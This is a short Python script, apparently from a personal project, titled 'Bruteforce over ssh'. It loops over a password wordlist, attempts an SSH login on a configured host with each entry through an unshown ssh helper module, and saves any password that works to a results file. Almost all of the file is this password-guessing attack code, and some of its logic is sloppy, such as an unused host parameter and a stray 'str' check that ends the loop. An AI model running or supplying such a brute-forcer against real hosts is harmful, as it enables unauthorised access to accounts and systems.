##
## Bruteforce over ssh
## author Felipe Lima <felipe@felipelima.eti.br>
##

import constant
import ssh

HOST = constant.HOST
DATASOURCE = constant.DATASOURCE

print("LOOKUP HOST: " + constant.HOST)

def execute():
    # file1 = open(DATASOURCE)
    with open(constant.DATASOURCE) as f:
        for line in f:
            #Connect SSH
            x = ssh.Ssh(status=False)
            r = x.main(line)

            if r == True :
                # Extract Password
                extract(line)

            if 'str' in line:
                break

def connect(param: str):
    execute()

def extract(password):
    filename: str = "results/passWD.txt"
    f = open(filename, "w+")
    f.write(password)
    f.close()

## START BRUTEFORCE
connect(HOST)